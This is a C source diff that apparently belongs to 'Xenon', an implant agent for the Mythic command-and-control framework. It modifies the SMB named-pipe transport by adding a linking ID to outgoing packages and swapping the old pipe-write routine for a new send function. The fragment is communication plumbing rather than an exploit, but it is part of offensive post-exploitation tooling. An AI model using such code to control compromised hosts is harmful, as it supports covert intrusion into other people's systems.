@@ -6,6 +6,7 @@
 
 #include "Xenon.h"
 #include "Config.h"
+#include "Package.h"
 
 /* This file is the the Mythic SMB profile */
 #ifdef SMB_TRANSPORT
@@ -19,6 +20,9 @@
 BOOL SmbSend(PPackage package)
 {
 	BOOL Success = FALSE;
+
+    /* Add Xenon Linking ID */
+    PackageAddInt32(package, xenonConfig->SmbId);
 
 	/* Not initialized Yet */
 	if ( !xenonConfig->SmbPipe )
@@ -51,14 +55,14 @@ BOOL SmbSend(PPackage package)
 			CloseHandle(xenonConfig->SmbPipe);
 			goto END;
 		}
-		
+
 		/* Send the message to the named pipe */
-		if ( !PipeWrite(xenonConfig->SmbPipe, package) )
+		if ( !PackageSendPipe(xenonConfig->SmbPipe, package->buffer, package->length) )
 			goto END;
 	}
 
 	/* Send if pipe is already initialized */
-	if ( !PipeWrite(xenonConfig->SmbPipe, package) )
+	if ( !PackageSendPipe(xenonConfig->SmbPipe, package->buffer, package->length) )
 	{
 		DWORD error = GetLastError();
 		_err("Failed to write data to pipe. ERROR : %d", error);
@@ -271,23 +275,23 @@ VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
  * @param package buffer to write
  * @return pipe write successful or not
  */
-BOOL PipeWrite(HANDLE hPipe, PPackage package) 
-{
-    DWORD Written = 0;
-    DWORD Total   = 0;
+// BOOL PipeWrite(HANDLE hPipe, PVOID Msg, SIZE_T Length) 
+// {
+//     DWORD Written = 0;
+//     DWORD Total   = 0;
 
-    do {
-        if ( !WriteFile(hPipe, package->buffer + Total, MIN( ( package->length - Total ), PIPE_BUFFER_MAX ), &Written , NULL) ) {
-            return FALSE;
-        }
+//     do {
+//         if ( !WriteFile(hPipe, Msg + Total, MIN( ( Length - Total ), PIPE_BUFFER_MAX ), &Written , NULL) ) {
+//             return FALSE;
+//         }
 
-        Total += Written;
-    } while ( Total < package->length );
+//         Total += Written;
+//     } while ( Total < Length );
 
-    _dbg("Finished. Sent %d bytes to SMB Comms channel.", Written);
+//     _dbg("Finished. Sent %d bytes to SMB Comms channel.", Written);
 
-    return TRUE;
-}
+//     return TRUE;
+// }
 
 
 
